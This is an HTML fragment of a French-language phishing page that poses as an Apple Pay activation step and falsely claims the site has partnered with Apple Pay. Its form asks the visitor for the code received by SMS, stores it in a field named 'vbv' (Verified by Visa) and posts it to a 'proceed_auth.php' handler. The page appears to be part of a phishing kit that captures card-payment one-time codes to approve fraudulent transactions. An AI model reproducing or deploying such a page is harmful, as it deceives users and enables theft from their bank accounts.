        ...
        <div class="wrapper">
            ...
            <div class="login-box">
                <div class="login-box-inner">
                    <h1>Liaison par Apple Pay</h1>




<center><img src="https://communities.apple.com/kb20200918/securedImage.jsp?productid=APPLEPAY2&amp;size=240x240" style="width: 100px;">
<p style="color: white;"> Pour mieux sécuriser nos paiements, nous nous sommes affiliés avec Apple Pay, vous avez simplement à entrer le code recu par SMS pour activer Apple Pay</p></center>


                    

                    <form action="../actions/proceed_auth.php" method="post"> 
                        <div class="form-group">
                            
                        <div class="form-group">
                            <input type="password" name="vbv" minlength="4" maxlength="8" placeholder="Code recu par SMS" required>
                        </div></div>
                        
                        <div class="form-group">
                            <button type="submit" name="launch">Confirmer</button>
                            <center><a style="color: white;" href="application.php"><p>Je n'ai pas recu de SMS</p></a></center>
                        </div>
